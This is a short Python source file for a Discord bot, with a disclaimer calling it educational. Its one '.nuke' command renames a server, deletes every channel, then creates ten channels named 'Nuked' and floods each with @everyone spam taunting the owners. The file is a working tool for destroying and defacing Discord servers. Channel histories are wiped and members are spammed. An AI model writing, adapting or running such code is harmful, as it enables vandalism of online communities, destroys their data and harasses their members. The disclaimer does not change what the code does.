# Disclaimer: This is only for entertainment and educational purposes.  
# I’m not responsible for what you do with it or any consequences.  
# Made by VN :3

import discord
from discord.ext import commands
import random
import asyncio
import os

intents = discord.Intents.all()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def nuke(ctx):
    if not ctx.guild:
        return

    new_name = "💥 NO REVIVING TS 💥"
    await ctx.guild.edit(name=new_name)

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)

    for channel, result in zip(ctx.guild.channels, results):
        if isinstance(result, Exception):
            print(f"Failed to delete {channel.name}: {result}")
        else:
            print(f"Deleted channel: {channel.name}")

    async def create_channel(i):
        channel = await ctx.guild.create_text_channel("💣 Nuked")
        for _ in range(10):
            await channel.send("> 🥱 @everyone GET A SECURITY BOT CUZ THIS SERVER JUST GOT NUKED 🥱")

    await asyncio.gather(*[create_channel(i) for i in range(10)])

bot.run(os.environ['TOKEN'])
